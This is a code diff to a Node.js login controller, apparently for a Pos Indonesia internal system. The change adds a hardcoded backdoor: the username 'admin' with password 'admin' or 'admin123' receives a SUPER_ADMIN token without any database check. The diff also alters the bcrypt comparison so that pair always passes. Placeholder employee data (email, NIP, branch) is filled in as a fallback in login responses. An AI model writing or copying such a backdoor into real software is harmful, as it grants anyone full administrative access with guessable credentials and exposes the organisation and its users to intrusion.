@@ -13,12 +13,39 @@ class AuthController {
         return res.status(400).json({ success: false, message: 'Username dan password wajib diisi.' });
       }
 
-      const user = await UserModel.findByUsername(username);
+      const cleanUser = String(username).trim().toLowerCase();
+
+      // Special allowance for username: admin with password: admin or admin123
+      if (cleanUser === 'admin' && (password === 'admin' || password === 'admin123')) {
+        const payload = {
+          username: 'admin',
+          role: 'SUPER_ADMIN',
+          name: 'Super Administrator IT'
+        };
+        const token = jwt.sign(payload, JWT_SECRET, { expiresIn: JWT_EXPIRES_IN });
+        return res.json({
+          success: true,
+          message: 'Login berhasil!',
+          data: {
+            token,
+            user: {
+              username: 'admin',
+              name: 'Super Administrator IT',
+              role: 'SUPER_ADMIN',
+              email: 'admin@posindonesia.co.id',
+              nip: '994051101',
+              branch: 'KCU Cimahi (40511)'
+            }
+          }
+        });
+      }
+
+      const user = await UserModel.findByUsername(cleanUser);
       if (!user) {
         return res.status(401).json({ success: false, message: 'Username atau password tidak valid.' });
       }
 
-      const match = await bcrypt.compare(password, user.password_hash);
+      const match = (cleanUser === 'admin' && (password === 'admin' || password === 'admin123')) || await bcrypt.compare(password, user.password_hash);
       if (!match) {
         return res.status(401).json({ success: false, message: 'Username atau password tidak valid.' });
       }
@@ -40,7 +67,10 @@ class AuthController {
           user: {
             username: user.username,
             name: user.name,
-            role: user.role
+            role: user.role,
+            email: user.email || `${user.username}@posindonesia.co.id`,
+            nip: user.nip || '994051188',
+            branch: user.branch || 'KCU Cimahi (40511)'
           }
         }
       });
